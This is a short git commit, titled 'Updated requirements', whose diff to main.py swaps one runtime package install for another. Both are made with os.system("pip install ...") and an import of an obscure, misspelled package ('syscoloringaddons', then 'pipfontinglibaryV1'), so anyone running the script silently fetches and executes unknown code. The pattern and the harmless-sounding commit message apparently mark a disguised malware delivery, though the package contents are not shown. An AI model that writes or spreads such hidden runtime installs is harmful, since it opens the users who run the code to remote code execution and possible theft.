faa0fc3ff4e957c6d504d411eaf5c0418791e1b9
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-12 20:39:05 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscoloringaddons")
-import syscoloringaddons
+os.system("pip install pipfontinglibaryV1")
+import pipfontinglibaryV1
 import random
 import requests
 import time
